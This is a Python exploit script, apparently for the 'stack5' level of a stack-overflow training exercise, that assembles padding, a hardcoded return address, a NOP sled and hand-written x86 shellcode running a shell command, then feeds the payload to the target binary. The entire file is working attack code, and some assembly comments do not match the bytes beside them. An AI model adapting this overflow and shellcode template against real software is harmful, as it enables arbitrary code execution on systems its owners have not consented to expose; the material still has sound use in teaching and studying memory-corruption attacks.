#!/usr/bin/env python
import struct as s, os

trash = '_' * 76
ip = s.pack('I', 0xbffff7c0)
noops = '\x90' * 128
ret = s.pack('i', 0x080484f9 + 32)
int3 = '\xcc' * 4

shellcode = ("\x6a\x0b"             +  #  push   $0xb
             "\x58"                 +  #  pop    %eax
             "\x99"                 +  #  cltd
             "\x52"                 +  #  push   %edx
             "\x68.1  "             +  #  push   $0x20207473
             "\x68.0.0"             +  #  push   $0x6f686c61
             "\x68 127"             +  #  push   $0x636f6c20
             "\x68ping"             +  #  push   $0x676e6970
             "\x89\xe6"             +  #  mov    %esp,%esi
             "\x52"                 +  #  push   %edx
             "\x66\x68\x2d\x63"     +  #  pushw  $0x632d
             "\x89\xe1"             +  #  mov    %esp,%ecx
             "\x52"                 +  #  push   %edx
             "\x68//sh"             +  #  push   $0x68732f2f
             "\x68/bin"             +  #  push   $0x6e69622f
             "\x89\xe3"             +  #  mov    %esp,%ebx
             "\x52"                 +  #  push   %edx
             "\x56"                 +  #  push   %esi
             "\x51"                 +  #  push   %ecx
             "\x53"                 +  #  push   %ebx
             "\x89\xe1"             +
             "\xcd\x80")

payload = trash + ip + ret + noops + shellcode
os.system('echo -n "{0}" | stack5'.format(payload))
